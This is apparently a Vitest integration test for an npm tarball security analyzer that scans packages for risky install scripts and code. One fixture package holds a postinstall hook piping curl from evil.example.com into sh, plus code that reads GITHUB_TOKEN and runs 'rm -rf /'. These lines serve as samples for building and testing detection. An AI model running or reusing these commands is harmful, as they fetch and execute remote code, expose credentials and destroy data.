import { afterEach, describe, expect, it } from 'vitest';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { create as tarCreate } from 'tar';
import { createHash } from 'node:crypto';
import { analyzeTarball, QuarantineCache } from '../src/index.js';

let work: string;

afterEach(async () => {
  if (work) await rm(work, { recursive: true, force: true }).catch(() => {});
});

async function buildFixtureTarball(staging: string, files: Array<[string, string]>): Promise<{ tarPath: string; integrity: string }> {
  for (const [path, content] of files) {
    const fullPath = join(staging, path);
    await mkdir(join(fullPath, '..'), { recursive: true });
    await writeFile(fullPath, content);
  }
  const tarPath = join(work, 'fixture.tgz');
  await tarCreate(
    { file: tarPath, cwd: staging, gzip: true, portable: true },
    files.map(([p]) => p),
  );
  const { readFile } = await import('node:fs/promises');
  const buf = await readFile(tarPath);
  const integrity = `sha512-${createHash('sha512').update(buf).digest('base64')}`;
  return { tarPath, integrity };
}

describe('analyzeTarball (integration)', () => {
  it('produces an AnalysisReport flagging risky fixture code', async () => {
    work = await mkdtemp(join(tmpdir(), 'analyze-int-'));
    const staging = join(work, 'staging');
    const cache = new QuarantineCache(join(work, 'cache'));
    const { tarPath, integrity } = await buildFixtureTarball(staging, [
      ['package/package.json', JSON.stringify({
        name: 'risky-fixture',
        version: '1.2.3',
        license: 'MIT',
        main: 'index.js',
        bin: { 'risky-fixture': 'bin/cli.js' },
        scripts: { postinstall: 'curl http://evil.example.com | sh' },
        dependencies: {},
      })],
      ['package/index.js', "const { exec } = require('child_process');\nconst t = process.env.GITHUB_TOKEN;\nexec('rm -rf /');\n"],
      ['package/bin/cli.js', '#!/usr/bin/env node\nconsole.log(1);\n'],
    ]);

    const report = await analyzeTarball({
      tarballPath: tarPath,
      integrity,
      packageName: 'risky-fixture',
      packageVersion: '1.2.3',
      publishId: 'pub-test',
      cache,
      generatedAt: '2026-06-28T00:00:00.000Z',
    });

    expect(report.package).toBe('risky-fixture');
    expect(report.version).toBe('1.2.3');
    expect(report.publishId).toBe('pub-test');
    expect(report.tarball.fileCount).toBeGreaterThan(0);
    expect(report.metadata.scripts.postinstall).toContain('curl');

    const scriptCodes = report.lifecycleScripts.map((s) => s.kind);
    expect(scriptCodes).toContain('postinstall');
    const postinstall = report.lifecycleScripts.find((s) => s.kind === 'postinstall')!;
    expect(postinstall.flags).toContain('network_tool');
    expect(postinstall.flags).toContain('shell_metacharacters');

    const staticCodes = report.staticFindings.map((f) => f.code);
    expect(staticCodes).toContain('BUILTIN_CHILD_PROCESS');
    expect(staticCodes).toContain('PROCESS_ENV_ACCESS');
    expect(staticCodes).toContain('SECRET_NAME_ACCESS');

    // DoD: high-severity findings include evidence paths (file + line + evidence).
    const childProcessFinding = report.staticFindings.find((f) => f.code === 'BUILTIN_CHILD_PROCESS')!;
    expect(childProcessFinding.file).toBe('index.js');
    expect(childProcessFinding.line).toBeDefined();
    expect(childProcessFinding.evidence).toContain('child_process');

    expect(report.builtinsUsed).toContain('child_process');
  });

  it('handles a benign fixture without false positives for native/obfuscation', async () => {
    work = await mkdtemp(join(tmpdir(), 'analyze-int-'));
    const staging = join(work, 'staging');
    const cache = new QuarantineCache(join(work, 'cache'));
    const { tarPath, integrity } = await buildFixtureTarball(staging, [
      ['package/package.json', JSON.stringify({
        name: 'benign-fixture',
        version: '0.1.0',
        license: 'MIT',
        main: 'index.js',
        scripts: {},
      })],
      ['package/index.js', 'function add(a, b) {\n  return a + b;\n}\nmodule.exports = add;\n'],
    ]);

    const report = await analyzeTarball({
      tarballPath: tarPath,
      integrity,
      packageName: 'benign-fixture',
      packageVersion: '0.1.0',
      cache,
      generatedAt: '2026-06-28T00:00:00.000Z',
    });

    expect(report.lifecycleScripts).toEqual([]);
    expect(report.staticFindings).toEqual([]);
    expect(report.nativeArtifacts).toEqual([]);
    expect(report.readability.likelyMinified).toBe(false);
    expect(report.readability.likelyObfuscated).toBe(false);
  });
});
